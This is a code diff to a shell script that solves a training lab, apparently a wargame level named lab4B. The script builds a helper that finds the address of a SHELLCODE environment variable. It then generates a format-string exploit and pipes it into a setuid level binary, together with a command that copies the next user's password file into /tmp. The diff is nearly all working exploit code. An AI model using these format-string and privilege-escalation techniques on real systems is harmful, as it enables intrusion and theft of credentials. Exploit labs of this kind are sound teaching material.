@@ -61,7 +61,7 @@ int main(int argc, char *argv[])
      there is a big chance that you may have to change it 
      to fit your environment */
 
-    p += ((strlen(argv[0]) - strlen(argv[2]))*2) - 6;
+    p += ((strlen(argv[2]) - strlen(argv[0]))*2) - 12;
 
     printf("%p\n", p);
     return 0;
@@ -71,7 +71,7 @@ EOF
 
 gcc -o /tmp/.getenvaddr /tmp/.getenvaddr.c
 
-addr=$(/tmp/.getenvaddr SHELLCODE /tmp/lab04/lab4B)
+addr=$(/tmp/.getenvaddr SHELLCODE /levels/lab04/lab4B)
 
 # Finally, a script that will create the format string exploit
 
@@ -103,7 +103,7 @@ print buf
 EOF
 
 # Password will be stored in /tmp/lab4B.pass
-passfile="/tmp/lab4B.pass"
+passfile="/tmp/lab4A.pass"
 
 (python /tmp/.fsvgen.py $offset $addr "0x18"; echo "cat /home/lab4A/.pass > $passfile";) | /levels/lab04/lab4B
 echo Password stored in $passfile
